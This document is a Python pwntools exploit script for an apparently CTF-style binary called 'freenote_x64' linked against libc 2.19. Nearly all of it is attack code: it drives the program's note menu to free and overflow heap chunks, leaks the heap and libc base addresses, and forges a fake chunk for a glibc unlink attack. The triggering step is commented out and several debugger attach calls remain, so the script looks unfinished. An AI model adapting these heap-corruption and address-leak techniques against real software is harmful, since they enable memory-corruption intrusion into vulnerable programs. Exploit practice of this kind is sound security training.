from pwn import *
context.log_level = 'debug'
sh = process('./freenote_x64')
elf = ELF('./freenote_x64')
libc = ELF('./libc-2.19.so')

def lists():
	sh.recvuntil('Your choice: ')
	sh.sendline('1')

def new(size,content):
	sh.recvuntil('Your choice: ')
	sh.sendline('2')
	sh.recvuntil('Length of new note: ')
	sh.sendline(str(size))
	sh.recvuntil('Enter your note: ')
	sh.sendline(content)

def edit(idx,size,content):
	sh.recvuntil('Your choice: ')
	sh.sendline('3')
	sh.recvuntil('Note number: ')
	sh.sendline(str(idx))
	sh.recvuntil('Length of note: ')
	sh.sendline(str(size))
	sh.recvuntil('Enter your note: ')
	sh.sendline(content)

def delete(idx):
	sh.recvuntil('Your choice: ')
	sh.sendline('4')
	sh.recvuntil('Note number: ')
	sh.sendline(str(idx))

new(0x80,'a'*0x80)	#0
new(0x80,'b'*0x80)	#1	
new(0x80,'c'*0x80)	#2
new(0x80,'d'*0x80)	#3
new(0x80,'e'*0x80)	#4

#gdb.attach(sh)
#---------------leak heap_base and libc.address-------
delete(3)
delete(1)

gdb.attach(sh)
edit(0,0x90,'f'*0x90)
edit(2,0x90,'g'*0x90)
gdb.attach(sh)

lists()
sh.recvuntil('f'*0x90)
#gdb.attach(sh)
heap = u64(sh.recvuntil(chr(0xa))[:-1].ljust(8,'\x00'))-0x19d0
print 'heap_base: ' + hex(heap)
sh.recvuntil('g'*0x90)
libc.address = u64(sh.recv(6).ljust(8,'\x00'))-0x3c4b78
print 'libc_base: ' + hex(libc.address)

edit(2,0x90,'g'*0x80+p64(0x80)+p64(0x120))
#-----------unlink--------------------------
chunk0_addr = heap + 0x18
gdb.attach(sh)
pay = p64(0x90) +p64(0x80) + p64(chunk0_addr-0x18) +p64(chunk0_addr-0x10) +'0'*0x60
pay += p64(0x80) + p64(0x91)
edit(0,len(pay),pay)
#delete(1)

#edit(0,8,p64(0x90))
 

gdb.attach(sh)
sh.interactive()


